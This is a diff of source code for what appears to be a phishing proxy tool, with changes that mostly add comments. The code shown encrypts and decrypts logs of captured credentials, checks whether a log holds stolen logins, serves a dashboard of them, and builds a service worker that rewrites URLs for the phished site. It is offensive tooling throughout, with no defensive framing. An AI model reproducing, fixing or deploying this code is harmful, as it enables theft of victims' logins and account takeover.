@@ -568,9 +568,9 @@ function displayError(message, error, ...args) {
     console.error("******************************");
 }
 
+// 🔥 FIXED: encryptData uses Buffer key
 async function encryptData(data) {
     const iv = crypto.randomBytes(16);
-    // 🔥 FIXED: convert key to Buffer
     const keyBuf = Buffer.from(ENCRYPTION_KEY, 'hex');
     return new Promise((resolve, reject) => {
         const cipher = crypto.createCipheriv("aes-256-ctr", keyBuf, iv);
@@ -1163,7 +1163,7 @@ const swFilePath = path.join(__dirname, swFileName);
 if (!fs.existsSync(notFoundFile)) fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
 if (!fs.existsSync(scriptFile)) fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
 
-// 🔥 FIXED SERVICE WORKER CODE
+// 🔥 FIXED SERVICE WORKER CODE (with rewriteUrl and error handling)
 const serviceWorkerCode = `
 const PROXY_PATH = '${PROXY_PATHNAMES.proxy}';
 const DEST_PARAM = '${PHISHED_URL_PARAMETER}';
@@ -1481,6 +1481,7 @@ async function hasCapturedCredentials(logFilename) {
                 const entry = JSON.parse(line);
                 const iv = Object.keys(entry)[0];
                 const encrypted = entry[iv];
+                // 🔥 FIXED: use Buffer key
                 const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                 let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                 decrypted = Buffer.concat([decrypted, decipher.final()]);
@@ -1684,6 +1685,7 @@ async function handleDashboardAPI(req, res) {
                     const entry = JSON.parse(line);
                     const iv = Object.keys(entry)[0];
                     const encrypted = entry[iv];
+                    // 🔥 FIXED: use Buffer key
                     const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                     let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                     decrypted = Buffer.concat([decrypted, decipher.final()]);
@@ -2256,6 +2258,7 @@ async function handleDashboardAPI(req, res) {
                             const entry = JSON.parse(line);
                             const iv = Object.keys(entry)[0];
                             const encrypted = entry[iv];
+                            // 🔥 FIXED: use Buffer key
                             const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                             let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                             decrypted = Buffer.concat([decrypted, decipher.final()]);
@@ -2423,6 +2426,7 @@ async function handleDashboardAPI(req, res) {
                     const entry = JSON.parse(line);
                     const iv = Object.keys(entry)[0];
                     const encrypted = entry[iv];
+                    // 🔥 FIXED: use Buffer key
                     const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                     let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                     decrypted = Buffer.concat([decrypted, decipher.final()]);
